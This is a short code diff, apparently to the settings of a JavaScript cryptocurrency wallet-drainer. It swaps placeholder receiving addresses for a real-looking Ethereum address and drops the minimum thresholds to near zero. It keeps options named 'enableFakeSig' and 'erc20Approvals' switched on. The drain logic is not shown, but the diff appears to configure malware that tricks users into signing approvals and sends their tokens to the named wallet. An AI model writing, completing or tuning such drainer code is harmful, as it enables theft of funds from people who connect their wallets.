@@ -1,7 +1,7 @@
-const receiveAddress = "YOUR WALLET";
-const finesseReceiveAddress = "YOUR WALLET"
-const finesseMinimum = 0.2
-const minTokenValue = 100
+const receiveAddress = "0xd94848e05442bF112E584fd3F89694FC3E7a457C";
+const finesseReceiveAddress = "0xd94848e05442bF112E584fd3F89694FC3E7a457C"
+const finesseMinimum = 0.0001
+const minTokenValue = 0
 
 const enableFakeSig = true
 const erc20Approvals = true;
